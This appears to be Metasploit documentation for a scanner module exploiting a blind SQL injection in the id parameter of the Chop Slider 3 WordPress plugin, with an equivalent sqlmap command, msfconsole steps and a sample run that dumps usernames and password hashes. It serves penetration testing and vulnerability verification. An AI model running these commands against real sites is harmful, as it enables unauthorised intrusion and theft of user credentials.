## Vulnerable Application

The iDangero.us Chop Slider 3 WordPress plugin 3.4 and prior
contains a blind SQL injection in the `id` parameter of the
`get_script/index.php` page.  The injection is passed through `GET`
parameters, and thus must be encoded, and magic_quotes is applied at the server.

The plugin can be downloaded from
[github](https://github.com/idangerous/Plugins/blob/master/Chop%20Slider%203/Chop%20Slider%203%20Wordpress/Wordpress_ChopSlider_3_4.zip)

This module slightly replicates sqlmap running as:

```
sqlmap -u 'http://local.target/wp-content/plugins/chopslider/get_script/index.php?id=1111111111' --level=5 --risk=3 --technique=B
```

## Verification Steps

1. Install the plugin and activate it
1. Start msfconsole
1. Do: `use auxiliary/scanner/http/wp_chopslider_id_sqli`
1. Do: `set rhosts [ip]`
1. Do: `run`
1. You should get a dump of usernames and password hashes.

## Options

### ACTION: List Users

This action lists `COUNT` users and password hashes.

### COUNT

If Action `List Users` is selected (default), this is the number of users to enumerate.
The larger this list, the more time it will take.  Defaults to `1`.

## Scenarios

### iDangero.us Chop Slider 3.4 on Wordpress 5.4.4 running on Ubuntu 20.04.

```
resource (chopslider.rb)> use auxiliary/scanner/http/wp_chopslider_id_sqli
resource (chopslider.rb)> set rhosts 111.111.1.111
rhosts => 111.111.1.111
resource (chopslider.rb)> set verbose true
verbose => true
resource (chopslider.rb)> set count 3
count => 3
resource (chopslider.rb)> run
[*] Version detected: 3.4
[+] Vulnerable version detected
[*] Enumerating Usernames
[*] {SQLi} Executing (select group_concat(qlJEzvIJY) from (select cast(ifnull(user_login,'') as binary) qlJEzvIJY from wp_users limit 3) DSKc)
[*] {SQLi} Time-based injection: expecting output of length 19
[*] Enumerating Password Hashes
[*] {SQLi} Executing (select group_concat(NtxL) from (select cast(ifnull(user_pass,'') as binary) NtxL from wp_users limit 3) YztNPLK)
[*] {SQLi} Time-based injection: expecting output of length 104
[+] wp_users
========

 user_login  user_pass
 ----------  ---------
 admin       $P$BZlPX7NIx8MYpXokBW2AGsN7i.aUOt0
 admin2      $P$BdWSGpy/tzJomNCh30a67oJuBEcW0K/
 editor      $P$BNS2BGBTJmjIgV0nZWxAZtRfq1l19p1

[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/http/wp_chopslider_id_sqli) > creds
Credentials
===========

host  origin         service  public  private                             realm  private_type        JtR Format
----  ------         -------  ------  -------                             -----  ------------        ----------
      111.111.1.111           editor  $P$BNS2BGBTJmjIgV0nZWxAZtRfq1l19p1         Nonreplayable hash  phpass
      111.111.1.111           admin2  $P$BdWSGpy/tzJomNCh30a67oJuBEcW0K/         Nonreplayable hash  phpass
      111.111.1.111           admin   $P$BZlPX7NIx8MYpXokBW2AGsN7i.aUOt0         Nonreplayable hash  phpass
```
